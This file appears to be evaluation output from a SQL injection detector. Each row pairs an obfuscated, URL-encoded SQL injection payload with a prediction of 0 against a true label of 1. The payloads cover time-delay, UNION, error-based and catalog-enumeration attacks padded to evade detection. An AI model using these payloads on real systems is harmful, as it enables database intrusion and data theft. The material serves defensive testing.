,Query,Prediction,Actual
3469,%31'%20o%72 %32/2-%31 %6fr%20SIN(%30) oR%20 0+%3838%34+S%49N(0%29=8-%38+%32/%32-%31+%53IN%280)+like%2b2%2a3-6 %20(%20 %27ab%63def%67'%2cupp%65r  (%20 %68ex%20 (%20 ra%6edo%6dbl%6fb  (%20 %350%3000%3000%30/%32  %20)%20 %20 )  %20   )%20   )  %20 ,0,1.0
3470,"%31'%20 %29 %20 %61Nd%201%20An%64 1%20&& ch%61r %20( %201%307%20 )%20 |%7cch%61r %20( %201%321  %29 %20|%7cc%68ar%20 (%20 %397%20 )%20 |%7ccha%72  %28 %208%30 %20 S%49N(0)%2b)%2b0%2b8-8+2%2f2%2d1+%53I%4e(0)%3d2*%33-6+2%2a3-%36+rege%78p%5fsubs%74ring+%53I%4e(0)+2/2%2d1  %28 %20re%70ea%74 %20( %20le%66t%20 ( %20c%72y%70t%5fkey%20 %28 %20c%68ar  %28  %365%20 )%20 ||%63h%61r %20(%20 %369  )  ||%63har  (%20 %383 %20) %20,n%75ll%20 %29 %20,0 %20)%20 ,%35000%300%3000%20 %29  %2cn%75ll%20 %29 %20-%2d ",0,1.0
3471,%31 %77aitf%6fr%20del%61y%20'%30:%30:%35'%2d- nn%6ep ,0,1.0
3472,"%31' %6fR%202/2%2d1%20Or%202*3%2d6%20O%52 %32*%33-6 OR %20S%49N(%30)%2b83%315%2bS%49N(%30)=%30+(+%38-8+2%2f2%2d1  %73e%6ce%63t%20cou%6et  %28 %20*  %29 %20 %66r%6fm %73ys%69b%6d.%73ys%74abl%65s%20as%20t%31,sys%69b%6d.s%79st%61b%6ce%73 a%73 %742%2cs%79s%69b%6d.sy%73ta%62l%65s%20a%73 %743  )%20  ",0,1.0
3473,1%27   )%20   )%20 %20 as%20yqe%6b w%68er%65 %20SIN(0)+1%395%37+%53I%4e(0%29=%32*3-%36+1957%2b2%2a3-6+%32/%32-%31 ,0,1.0
3474,"1%20""%20 %20)%20 %20 %29  %20 %20) %20 %61N%44 1%20&& 1%20a%4eD 37%315 i%6e   %20(%20 %20 ( %20 %63h%61r  %28 %201%313  ) %20+ch%61r%20 ( %201%313 %20)%20 +cha%72  (  112%20 )%20 +%63h%61r%20 (%20 %3106%20 )  %2bc%68ar%20 (%20 1%313%20 ) %20+%20 ( %20sele%63t %20 %28  ca%73e w%68en%20  %28   8%2d8%2b2%2a3-%36+8-8+37%315=2*3-6+%30+371%35+S%49N(0)+%32*%33-%36+8%2d8 %20) %20 %74he%6e c%68ar%20 %28  %349  ) %20 %65ls%65 c%68ar%20 %28 %2048 %20)  %20e%6ed%20  )%20 %20 %29 %20 %2bc%68a%72 %20(%20 %3113%20 )%20 %2bc%68ar  (%20 %3122 %20)%20 %2bchar%20 %28 %201%318  %29  %2bc%68ar%20 (  %3122 %20)%20 %2bc%68a%72  (  1%313%20 %20)    %29 %20 %20 %29 %20 %61n%64  %20 (%20 %20 %28 %20 %20 %28   %22f%6awv%20"" %6cik%65  %22f%6awv%20",0,1.0
3475,%31 %20)%20 %20a%73 hgg%69 w%68ere%20 %30+%38-%38+%365%311+S%49N%280%29+S%49N%280)=2%2a3-6%2b6511+S%49N%280%29+%30+%38-%38+%32*%33-6%20,0,1.0
3476,%31'  %20) %20  %29  %20 O%72 %32/2-1%20Or  %53IN%280)+0%2b8%3384+2%2f2%2d1+S%49N(%30)%2b8-8=2/%32-1+%38-%38+S%49N%280%29+%32/%32-1+%6cik%65 %20(  %27a%62cde%66g'%2cup%70e%72 %20(%20 h%65x  %28 %20r%61nd%6fmb%6cob  %28 %205%3000%300%300%30/2 %20 )  %20 %29  %20   ) %20 %20)%20 %20 aND%201 %61n%64 %20 %20(%20  %20( %20  %30+%38-%38+'%67xp%72'%3d'%67xp%72+2*%33-6%2b2%2f2-%31 ,0,1.0
3477,"-6%3662%20""   %29 %20 %20)%20 %20 un%69o%6e %61l%6c s%65l%65ct 6%3755-- ",0,1.0
3478,1'%2b  %28  s%65l%65ct%20'%68plm' wher%65  0%2b0+%3400%38=S%49N%280)+%53IN%280%29+%3400%38+%53IN(%30)+S%49N%280%29+%30 %61N%44 %31 %61nd%201 %61nd  %30+S%49N%280)+%32/%32-1+%53IN(0%29+85%394=%32*%33-6%2b2%2a3%2d6%2b(%2b0+S%49N(%30)+0%20 %73e%6ce%63t 85%394%20f%72o%6d p%67_s%6ce%65p%20 ( %205%20  ) %20 %20) %20 %2d- ,0,1.0
3479,"%31' %20 )   %20)   %20 )%20 %20A%4eD 1%20An%64 1%20And %208-%38+SI%4e(%30)+%32*%33-%36+%392%354+%53I%4e(%30)=2*%33-%36+%32/2%2d1%2b(%2b2/%32-1%2bSI%4e(0%29 %20se%6ce%63t co%75n%74 %20(  *%20 )  %20f%72om %72d%62$fields%20as %741%2cr%64b%24ty%70es%20a%73 %742,%72db%24col%6ca%74io%6es%20a%73 t%33,r%64b$fu%6ec%74io%6es as %744 %20) %20-%2d ",0,1.0
3480,"1%20"" %20 ) %20 %20)%20  %20A%6ed %31 A%6ed %6dake%5fse%74 %20(%20 %208%2d8+%30+%30+8%3266%3d2%2f2-%31+92%326%2c9%3226+%30 %20)%20  an%64  %20 %28    (%20 %20 ""%6fmjx "" l%69k%65 %20""%6fmjx ",0,1.0
3481,1%27||  %28  se%6ce%63t%20'ox%64h'%20wh%65re  S%49N(%30)%2b69%367+%30=%30+%369%367%2b2/2-%31+2%2a3%2d6 a%4eD%201%20AN%44 sl%65ep%20 %28 %205  )  %23 ,0,1.0
3482,sel%65ct  %20(%20 ca%73e w%68e%6e  %20(%20 %200%2b2%2f2%2d1+%3569%38+%53I%4e(%30)%3d3%3453%2b2%2a3-6%2b2*%33-%36 %20)%20 %20t%68en%205%3698%20el%73e 1/%20 ( %20s%65lect 0%20 ) %20 %65n%64 %20)%20 %2d- ,0,1.0
3483,"%2d57%376%' un%69on%20a%6cl %73e%6ce%63t%203%307%35,3%307%35,%330%375,3%3075%2c307%35-%2d ",0,1.0
3484,"1%27 %20 %29 %20  )%20   as%20o%6cdh%20w%68e%72e %200%2b0%2b2%2f2%2d1+%395%351%2b0+2/2%2d1=8%2d8+%38-%38+%395%351%2b2/%32-1+%32/%32-%31 uni%6fn%20a%6cl%20s%65lec%74 %6eu%6cl%2cnul%6c,%6eull#%20",0,1.0
3485,%31 %72like sle%65p %20( %205%20 %29  %23 ,0,1.0
3486,1%20 %29   %72l%69k%65 %20 %28 %20select%20  (%20 c%61s%65 %77h%65n%20 %20(%20 %202*%33-6+%32*%33-%36+5477+%32/%32-1+%32/2-1+2%2a3-6=S%49N(%30)+74%392+%53I%4e(0%29+%30 %20)%20 %20t%68en %31 %65l%73e %30x%328 en%64   %29  %20 %29 %20 %20a%6ed%201 %61ND%201 a%4ed %20 %28   2%2f2%2d1+4%3427+%38-8+%32/2%2d1=%53IN%280%29+%344%327%2b0 ,0,1.0
3487,"1 "" %61N%44 1 %61ND%20 62%340+%32*3%2d6%2b2%2a3%2d6=0+(+0%20 %27qq%70j%71'%7c|%20 %28  %73ele%63t%20c%61s%65 6%3240 %77he%6e 6240 th%65n%201%20el%73e %30 e%6ed f%72om %72db$dat%61b%61se %20)  |%7c'q%7av%7aq%27 %20)%20  a%6ed%20 ""%73ck%68 ""%202*%33-%36++%32*%33-%36+%32/2-%31=%32*%33-%36+0%2b+8%2d8+%38-8 ""%73c%6bh%20",0,1.0
3488,%31 %22 %20)   whe%72e %20160%37+%38-%38+SI%4e(%30)+%38-%38=1%3607+8-8%2b0 ,0,1.0
3489,%31%%27 %20 %29 %20  %29    oR %32*%33-6 oR %30 %4fR %30 %4fR %20 %28 %20se%6cect %2a %66ro%6d %20 (%20 %73el%65ct  (%20 %73le%65p  %28 %205%20  %29   %20)%20 %20  %29 %20y%64pu  %29  %20aNd 1 %61nd%20   %28  %20 %28  %20 %38-%38+2%2a3-%36+2/%32-%31+%32*%33-6%2b8%2d8+%27%'%3d2%2a3-%36+0%2b'+%38-%38+0%2bS%49N(0) ,0,1.0
3490,"-4%3194%20""%20  %29    )%20 %20  %29  %20or 8-8 %4fR%20 47%347%2b8-8+%38-8=%32*3-6%2bdb%6ds%5fu%74il%69t%79.%73q%6ci%64_%74o%5fsq%6chas%68+%30 %20 (%20  %20(%20  ch%72  %28 %2011%33  )%20 %7c|%63h%72 %20( %2011%33  ) %20||%63hr%20 (%20 112%20 )  ||chr  (%20 1%306  %29  %7c|%63hr %20(  1%313 %20)%20 |%7c 8-%38 %7c| %20(%20 select%20 %20(  case%20w%68e%6e %20 (   S%49N%280%29+4%374%37+%32/2%2d1%2b8%2d8+%53I%4e(%30)=0+%3474%37+%30+2*%33-%36 %20)   %74hen 1 %65l%73e %30 %65n%64 %20) %20 fr%6fm %64u%61l%20 %29  %7c|c%68r%20 (%20 %3113%20 %29 %20||ch%72 %20(%20 1%322%20 )%20 %7c|%63h%72 %20( %2011%38 %20)  ||ch%72 %20(  %3122 %20) %20|%7cchr%20 %28  %311%33 %20 %29 %20 %20)    %20) %20 a%6ed %31 aNd 1 aND    (  %20 (%20 %20 %20(%20 %20""d%64bc%20"" l%69ke %20""dd%62c ",0,1.0
3491,"%31 %20 %29   %20)%20   %61s rual%20w%68er%65 %202%2f2%2d1+4%3649+2%2a3-%36+%32/2-%31=%30+8%2d8%2b4%3649+2%2a3%2d6%2b0 aNd 1 %61N%44 %31 A%6ed %20 (%20 %73elec%74 %32*%20 (  i%66   (%20 %20 %28  %20s%65lect%20* %66r%6fm   (%20 %73el%65ct %63on%63a%74  %28 %200%787%317170%36a71%2c  %28 %20s%65lec%74  %20(  e%6ct%20 %28   %3348%34+%38-8+S%49N%280)%3d0+%53I%4e(0)%2b348%34,1 %20 %29    )%20  %20 )  %2c0%787%317a767a%371%2c0%7878%20  )%20   %29 %20 %73  %29 %20,%208%34467%3440%373%37095%351610, %384%346%374%340%37370955%31610%20 %20)%20 %20 %29    %20)%20 %2d-%20",0,1.0
3492,"%31% ""%20 %20)   %20)%20  %20unio%6e %61ll%20s%65l%65c%74 %6eu%6cl-- ",0,1.0
3493,%31'+%20 %28 %20s%65lect%20'cz%70g' w%68er%65  %30+%36627%2bSIN%280%29+%32/%32-1%3d2*3%2d6+%38-8+2*%33-6+6%3627+0+%32/%32-1 A%4eD%201%20a%6ed  2%3006+S%49N%280%29+%30+0=SIN%280%29+%320%306%2bS%49N(0%29+0 ,0,1.0
3494,"se%6ce%63t co%75nt%20 %28 %20* %20)%20 %20from%20d%6fm%61i%6e.d%6fma%69n%73 %61s%20t%31,%64oma%69n%2eco%6cumns%20as%20t%32,d%6fma%69n.t%61b%6ce%73 %61s %743 %41n%64 %31 A%4eD%20  %20( %20 %20( %20   %28   %22% %22 0+2*3-%36+=2%2f2%2d1+0%2b ""%20",0,1.0
3495,%31' %20)%20  %72lik%65 %20 (%20 s%65l%65c%74 %2a %66r%6fm%20 %20(%20 selec%74 %20(  sle%65p  %28  5   )%20   )%20 %20  )%20 sgv%6f %20) %20 An%64 1%20A%4eD%20 %20(%20 %200%2b2*3%2d6+%27z%71iw%27+2%2f2-%31+%32/%32-1+%30=0+%32*%33-6+8-8%2b'zq%69w%2b8%2d8+2/%32-1%20,0,1.0
3496,%2d15%364'  )%20 %20o%72d%65r b%79 1-%2d ,0,1.0
3497,"%31%%27 %75nio%6e al%6c %73el%65ct %6eu%6cl,null,nu%6cl,null,%6eul%6c,%6eul%6c,%6eu%6cl%2cnu%6cl,n%75ll,%6eu%6cl%2d-%20",0,1.0
3498,%2d7%3060'%20 )%20 %20O%52 %30 oR%202%2a3%2d6%20oR %6da%6be%5fse%74 %20(%20 %202/2%2d1%2b423%33+%32*%33-6+2%2f2-%31=1689%2c16%389%2b2%2f2%2d1+0%20 )%20  And%201 A%6ed%20 %20( %20'tw%70r%27 lik%65 't%77pr ,0,1.0
3499,"%31'%20  )%20 %20 ) %20 %20un%69o%6e all%20se%6cec%74 n%75ll%2cnu%6cl,%6eull%2cnu%6cl,nul%6c,n%75l%6c,%6eull%2cn%75ll%2cn%75ll,null#%20",0,1.0
3500,"1%20"" %77here  %32*%33-6+%383%333%2b0%2b2*3-6+%53I%4e(%30)%3d2%2a3-6%2b833%33+8%2d8 ",0,1.0
3501,%69f%20 (%20 %200+%36745%2bSIN(%30)=S%49N%280%29+%38-8+2%2f2%2d1%2b4%307%38+%32/%32-%31+8-8%20 %29 %20 %73e%6ce%63t%206745 %65lse%20d%72o%70 fu%6ecti%6fn%20yty%74-- ,0,1.0
3502,%31%%27 AND %31 AN%44 %208-8%2b2%2f2-1%2b1%3736%2bSI%4e(%30)=0+%32*3-%36+%342%320%2bSI%4e(%30)%2b0+%30 ,0,1.0
3503,"%2d7%3528%27 %7c| %38-%38 o%52 2%2a3-6 |%7c m%61k%65_%73e%74  (   %32*%33-6+0%2b3%3809+%32*3%2d6%2b2*3%2d6=%38-8+1%3821,%318%321%2b2%2a3%2d6%2b2%2f2-1%20 )  %20An%64 %31 a%4eD %31 A%6ed %20SIN%280)+%53I%4e(%30)+%38-%38+'%6bg%63h%27+%32/%32-%31+8-8=2%2f2-%31+%27kg%63h+%32/%32-%31+0 ",0,1.0
3504,"-%381%353'%20wh%65re%20 SIN(0)%2b2%2f2%2d1+%3243%36=0+%32436%2b0%2b0%20un%69o%6e %61l%6c %73e%6ce%63t 2436,2%3436%2c243%36,2%343%36,%324%336%2c24%336%2c2%3436,%32436,2%3436%2c2%343%36# ",0,1.0
3505,"1'%7c|%20 %28  s%65l%65c%74 %27f%63w%73' f%72om d%75a%6c wh%65r%65  8-8+%32/%32-%31+%391%384=8-8+%391%384+2%2a3-%36 %41N%44 1 and%201%20aN%64 upd%61t%65x%6dl%20 %28  %3339%33,co%6ec%61t%20 %28 %200%782%65,%30x%371%37170%36a%371, %20(%20 s%65l%65ct%20  (%20 e%6ct  %28   %32*%33-%36+%3339%33+%38-8%2b2*3-%36=0%2b2%2f2%2d1+%32/%32-%31+%33393%2c1+%38-8+2/2-1   )%20   )%20 %20 %20)%20 %2c0x7%317a76%37a%371 %20)%20 ,11%361 %20 )%20   )%20  %7c|'%20",0,1.0
3506,"1%20"" %20) %20 as te%63q%20w%68ere  48%317+%32*3%2d6+%53IN(%30)%3d0+0%2b2*%33-%36+2*%33-%36+%34817%2b2%2f2-%31 AND 1%20a%4ed 1%20a%4ed%20 S%49N%280%29+81%389+2/%32-%31+8-8+8-%38=%32*3%2d6+%28+2/%32-%31  sel%65c%74 %63o%75n%74 %20(%20 *%20 %29 %20 fro%6d %73y%73i%62m.%73y%73t%61bles a%73 %741,sysi%62m.%73y%73t%61ble%73 as%20t2%2csysibm.%73y%73t%61b%6ce%73 as t%33  )%20 %2d-%20",0,1.0
3507,"%31 "" oR 2%2a3-%36 %4fr%202/2-%31 %6fR%20e%6ct%20 %28  %202%2a3-6%2b5%3873+0=%32/2%2d1+5%387%33,%73lee%70+8-8%2b8-8+2%2a3%2d6+0%20 (  5%20 %20)%20 %20 %29 %20 #%20",0,1.0
3508,"1%20 %29 %20 %6fr%202%2a3-6%20or %32*%33-6 %6fr%20  ( %20sel%65ct 9%317%33 %66ro%6d  %28  s%65l%65ct c%6fu%6et %20(  %2a  )%20 ,%63o%6ecat  (%20 0%787%317%31706a71, %20( %20s%65l%65c%74 %20 %28  elt %20( %20 %53IN(%30)%2b9%317%33+0%2b8%2d8=S%49N%280%29+%53IN(0)+9173%2c1%2b8-8+2*%33-%36+%32/2-%31 %20 )%20 %20 %29   %20 ) %20,0x%371%37a%376%37a7%31,%66loo%72 %20( %20r%61nd  %28 %200 %20)  *2%20  )%20  %20) %20 x%20fr%6fm%20i%6efo%72m%61t%69on%5fsc%68ema.ch%61r%61c%74er_%73et%73 group b%79 x%20 ) %20a%20 %29   aN%64 1 %61Nd%20  (%20  0%2b79%384+2%2a3%2d6+%53I%4e(%30)+%38-%38=%53IN(%30)+7984%2bS%49N(0)%2b2/2-1+%30 ",0,1.0
3509,%31'%7c|%20 %28 %20s%65l%65c%74 '%62s%62v'%20f%72o%6d %64ua%6c %77he%72e %208%2d8+8-8%2b5%327%36+%30+%32/2-%31+2*3%2d6%3d0%2b52%376+2%2f2-1 %6fr %38-8 %4fr%208%2d8 oR %20 %28 %20select %2a f%72om %20 %28  %73e%6ce%63t  %28  %73l%65ep%20 %28 %205 %20 %29  %20 )%20  %20 ) %20y%64p%75 %20 )%20  %20)   |%7c'%20,0,1.0
3510,%2d9810%27  ) %20 whe%72e%20 %30+%32*%33-%36+%343%361=%343%361+8-%38+%38-8%20Or%202*3-6%20oR%208-%38 Or %65l%74 %20(%20 %2010%332%2b8%2d8%2b2%2a3%2d6%3d8%2d8+%310%332%2c3%362%33+2/2-1%20 %29  -%2d ,0,1.0
3511,"%31% %22  )   r%6cike%20  %28 %20se%6cec%74 %2a fr%6fm%20  (%20 s%65lec%74  %28 %20s%6cee%70 %20(%20 %35   )%20 %20 %29   %20 )  sg%76o %20)%20  a%4eD%201 a%4ed   (%20  ""%25 %22 %32/2-%31+2%2a3%2d6+%2bS%49N(0)=2/2-%31++%32*%33-%36+2*3%2d6 ""%20",0,1.0
3512,"1 %22 %20 )%20 %20 %29    And 1 %41nd  2%2a3%2d6+0%2b77%356%2b2%2a3%2d6=S%49N(0)+dbm%73_u%74i%6cit%79.%73q%6cid%5fto%5fs%71lhas%68+0+2*%33-%36 %20 %28    %28 %20 c%68r%20 %28 %201%313  %29 %20|%7cc%68r%20 (%20 11%33  )  ||c%68r%20 (  1%312%20 %29 %20||%63h%72  %28  %3106 %20)%20 |%7cchr %20( %20113 %20)%20 %4fR 2%2a3%2d6 O%52 %20(%20 se%6ce%63t%20 %20(%20 cas%65 when   ( %20 SIN(0)%2b77%356+8%2d8%3dSIN(0)%2b7%375%36+%38-8+0%2bSIN(%30)%20 %29   t%68e%6e %31 el%73e 0 %65n%64  )%20  f%72o%6d d%75al%20 %29  %7c|chr  ( %20113%20 ) %20||%63hr%20 %28 %2012%32 %20)%20 ||%63h%72  (%20 1%318  %29  ||%63h%72 %20(%20 122  %29 %20||c%68r%20 (%20 %311%33   )%20   %29 %20  %20)   an%64 %20  %28 %20  (%20   %22x%71lh%20"" 2*%33-%36++2/%32-%31=+%53I%4e(0%29+0+S%49N(0) ""%78q%6ch ",0,1.0
3513,%31' %20 )%20  %20)%20 %20 w%61it%66or%20d%65l%61y '%30:0:5'%2d-%20,0,1.0
3514,"-8%309%33 ""%20 %20) %20 %20)%20   as%20ob%6fi%20where %208%2d8%2b8%2d8+%3147%36=%32*3-6+1%347%36+2/%32-%31+2/%32-%31+2*3%2d6%2b8-%38 %75ni%6fn%20a%6cl%20s%65le%63t %31476,1476,%314%376%2c147%36#%20",0,1.0
3515,%31 %22 w%68e%72e%20 2*3%2d6%2b9341%2b2%2f2-%31=%53IN%280)+%53IN%280%29+2%2a3-6+%3934%31+0%2b2*3-%36 ,0,1.0
3516,"%2d37%303 %22 %20 %29   %20) %20  %20)  %20uni%6fn%20all s%65l%65c%74 329%33,329%33,3293,%33293,3%329%33,3%329%33,%3329%33,32%393,3293,%332%393%23 ",0,1.0
3517,"%31  %20) %20 %20)  %20 %20)  %20p%72o%63e%64u%72e%20a%6ealyse  %28 %20e%78t%72actva%6cu%65 %20(  %358%340%2cc%6fnc%61t%20 %28  %30x5c,0x%371%371%3706a%371%2c  (%20 sel%65ct %20 (  %63a%73e %77h%65n%20 %20(%20  %53I%4e(0)+%53IN(%30)+0%2b5%384%30+0+0=%32*3-6+SIN%280%29+5%3840%2b8%2d8%2b0  %29  %20t%68en %31 e%6cs%65 %30 e%6ed%20  )%20  %20)%20  %2c0x%371%37a76%37a%371%20  %29  %20 )%20 %20,%31 %20)%20  a%6ed %31 %41nd%20 %20 %28  %20 %28  %20  %28 %20 %30+%38-8%2b7%3813=2/%32-%31+%378%313%2b8-%38 ",0,1.0
3518,%31 %61nd%201%20&%26 1%20A%6ed%20 8-%38+62%340%2b2*3%2d6%3d8-%38+%53I%4e(0%29+%28+8%2d8%2b2/2%2d1 %20'qq%70jq%27|%7c  (%20 selec%74 ca%73e %36240 %77hen%206%3240 t%68e%6e 1%20els%65 0 %65n%64 %66r%6fm%20rd%62$%64a%74abase %20)%20 ||%27q%7avzq%27 %20)%20 %2d-%20i%7aa%64 ,0,1.0
3519,"%73el%65c%74 %63o%75n%74  %28  * %20)   %66r%6fm%20do%6dain%2edomains a%73 %741,%64oma%69n%2ec%6flu%6dns as%20t2,%64oma%69n%2et%61b%6ces a%73 %743  )%20 |%7c'%20",0,1.0
3520,1'%20in%20b%6fo%6cea%6e m%6fde %20)%20 %20oR%20S%49N(%30) %4fr%202*3%2d6 %4fr %202%2f2%2d1%2b8-%38+SI%4e(%30)+7%3427+2%2a3-6=2%2f2%2d1+%32/2%2d1%2bd%62ms%5fp%69p%65.re%63e%69ve%5fmes%73age+S%49N%280%29+2/2-1 %20(  %63hr%20 %28  1%316%20 )%20 %7c|%63h%72 %20(  87  )%20 %7c|ch%72 %20(%20 %390 %20)  %7c|%63h%72 %20( %20109%20 )%20 %2c5%20 )  %2d-%20,0,1.0
3521,"%2d44%353%27   )   %20) %20   )%20 %20o%72 0%20or%20 2*3%2d6%2b1%357%30+%32/%32-1+%30+SIN%280%29+%38-%38=S%49N(%30)%2b2%2a3-%36+%63onv%65rt+%32*%33-%36 %20( %20i%6et, %20( %20se%6ce%63t c%68a%72 %20(  113%20 )%20 +%63h%61r  (%20 %311%33 %20)%20 %2bchar  %28 %201%312  )%20 +%63ha%72  (%20 %310%36 %20)%20 %2bchar  (  113%20 )%20 %2b %20(  %73e%6ce%63t %20 %28  %63ase %77he%6e %20 (%20 %20S%49N(%30)%2b8-8%2b15%370+2/2-1+S%49N%280%29=8-8%2b2*3-6+%3157%30+%53I%4e(%30)%2b0%20 )%20  %74h%65n%20c%68a%72 %20(%20 %349%20 )%20  %65l%73e c%68ar%20 %28 %2048%20 %29 %20 %65n%64 %20 )    )%20 %20+%63har%20 %28 %2011%33 %20)  %2bc%68a%72  %28  1%322  %29  %2bcha%72  %28  %3118  ) %20+c%68a%72  (%20 1%322%20 )%20 %2bchar %20(%20 1%313%20 %20) %20  ) %20   %29 %20 %41nd %31 an%64 %20 %20(%20 %20 %28    %20( %20 %53I%4e(0%29+2*3%2d6+%27b%6fx%74'+%53IN(%30)=%53IN(%30)%2b'%62ox%74+SIN(0%29+2/%32-%31+%30 ",0,1.0
3522,"-31%330  %29 %20 u%6ei%6fn %61l%6c s%65lect%201%3741%2c17%341%2c174%31,%317%341,%3174%31,174%31,%31741,%317%341# ",0,1.0
3523,"%2d4%3233%%20""%20 )   OR%200%20o%72 %32/%32-%31 Or  %20( %20 2%2f2-1+%53IN(0%29+8-%38+%38459%3dSIN%280)+%38-%38+%384%359%20 )%20 *49%306%20A%6ed%201 %61N%64  %20(%20  %22%%20"" %32*3%2d6%2bS%49N(%30)+%30+%38-8+%2b2%2f2%2d1%3dS%49N%280%29+%32*3-6+%2b2%2f2-%31 "" ",0,1.0
3524,"1%20  %29 %20  %29  %20 %75n%69o%6e %61ll%20se%6cec%74 %6eull%2cnul%6c,nu%6cl,%6eull,null,%6eul%6c,%6eu%6cl%2cn%75l%6c,%6eull%2d-%20",0,1.0
3525,"%2d5528%27 %20) %20 unio%6e %61l%6c se%6ce%63t%205%3153,%351%353%2c515%33,51%353,%351%353,5153,515%33,5%315%33,51%353#%20",0,1.0
3526,"%2d4%358%39 "" %20) %20 %75nion%20a%6cl se%6cect%201441,14%341%2c1%344%31,%3144%31,144%31,14%341,144%31,1%344%31,14%341%2c14%341-%2d ",0,1.0
3527,"%31',%20 (  %63a%73t   %28 %20  %28  %20c%68r  %28 %201%313 %20)%20 ||%63hr%20 ( %2011%33  ) %20||%63hr%20 %28  11%32 %20)%20 %7c|ch%72 %20(  %3106 %20) %20|%7cch%72 %20(  %311%33   )%20 %20 ) %20 %4fR%208%2d8%20|%7c %20(  sele%63t%201 %66r%6fm g%65n%65r%61t%65_%73erie%73 %20(%20 8%3979%2c8%397%39,%63a%73e %77h%65n  %20( %20 S%49N%280%29+897%39+2/2%2d1%2b8%2d8=2/%32-%31+8%397%39+2*%33-%36+%38-%38+2%2f2%2d1%20 ) %20 %74he%6e %31 else%200%20end%20 )%20  %6cim%69t 1%20 %29  %3a:te%78t|%7c %20(  %63h%72 %20(  1%313%20 ) %20||%63hr%20 %28  %3122%20 )%20 |%7cc%68r%20 ( %20118%20 )  %7c|%63hr  %28 %201%322%20 )  |%7cc%68r %20(  1%313 %20 %29    %29 %20 %20as%20nu%6deri%63  %20)%20 %20 %29    ",0,1.0
3528,-%382%324' %20)%20 %20whe%72e%20 2/2-1%2bSI%4e(0%29+%3650%34+8%2d8+2%2a3%2d6%2b2%2f2%2d1%3dSI%4e(0)%2b6%350%34+%32*%33-%36+%30+0%2b2%2a3%2d6%20o%72 %53IN(%30)%20OR %38-8%20O%72  %32*%33-%36+0+%32461%2b2%2f2%2d1%3d2/2%2d1+5%366%30+2%2a3-6%2bSI%4e(0)%20,0,1.0
3529,"%31 whe%72e %20SIN%280)+8-%38+SI%4e(%30)%2b719%36=2*3-6%2b7196%2b2%2a3-%36 Or%20S%49N%280%29 o%72 %202%2a3-%36+%384%366%2b8-8%3d2%2a3-6%2bbe%6ec%68mar%6b+2*3%2d6%20 (  5%30000%300,m%645%20 %28  0x6%394%6147%345 %20 )   %20)%20 %20-%2d ",0,1.0
3530,"1%20wh%65r%65  %38-%38+%32/%32-1+6%3881%2bSI%4e(%30)%2b2%2a3%2d6=0+8-8%2bS%49N%280)+688%31+0%20p%72oced%75re %61n%61l%79se%20 ( %20e%78tra%63t%76a%6cu%65  %28  %3584%30,co%6ecat %20( %200%785%63,%30x%371%371%3706a71,  ( %20sel%65c%74 %20 (%20 %63ase%20w%68en%20  %28  %200+SIN(0%29+%30+584%30=%32/%32-%31+2%2a3-6+5%384%30 %20) %20 t%68en%201 %65ls%65 %30 %65nd%20 %20)%20  %20)   %2c0%78717%6176%37a%371%20  %29  %20 )%20 %20,%31 %20)%20 -%2d ",0,1.0
3531,"-%351%330'%20 %20) %20 %20)   %20un%69on%20a%6cl %73el%65c%74 5%3218%2c5%3218,5%321%38,5218%2c5%3218%2c5%3218,5%3218,%352%318%2c521%38,%352%318%2d-%20",0,1.0
3532,"-%377%397%27+ %20(%20 %73elec%74 o%75lr%20wh%65r%65  %38-%38+%370%391%2b8-%38=0+%37091%2b2*3%2d6%2b2%2f2-%31+SIN(0)%2b8-%38 %75n%69on a%6cl%20sel%65ct %370%391%2c7%309%31,70%391%2c7%309%31,%3709%31,70%391%2c70%391%2c7091,7%3091#%20",0,1.0
3533,-%3312%35'   )%20   )%20  %20 )%20  %6fr%64er%20by%201%23 ,0,1.0
3534,"1%20""%20un%69on a%6cl %73ele%63t%20n%75ll,n%75ll%2cnu%6cl,%6eull%2cnu%6cl%2cn%75l%6c,%6eul%6c,nu%6cl%23 ",0,1.0
3535,"%31  %29 %20 %61Nd %31 aN%64 %202%2a3%2d6+55%356%2b2%2a3%2d6=8%2d8+(+%53IN(0%29+S%49N%280%29+%32*3%2d6%2bS%49N%280%29 %20select %63ou%6et%20 %28  *%20 )  %20fr%6fm%20al%6c_u%73e%72s%20t1%2cal%6c_u%73e%72s%20t%32,a%6cl_%75s%65rs%20t3,%61ll%5fusers%20t%34,%61ll%5fus%65r%73 %745%20 %29 %20 ",0,1.0
3536,%2d9%3087%20o%52 %30 ||%202/%32-%31 or%20 %38-%38+SIN%280)%2b3%303%38+%30+%32*3%2d6%2b2%2a3%2d6=%330%338%2b0+%30 ,0,1.0
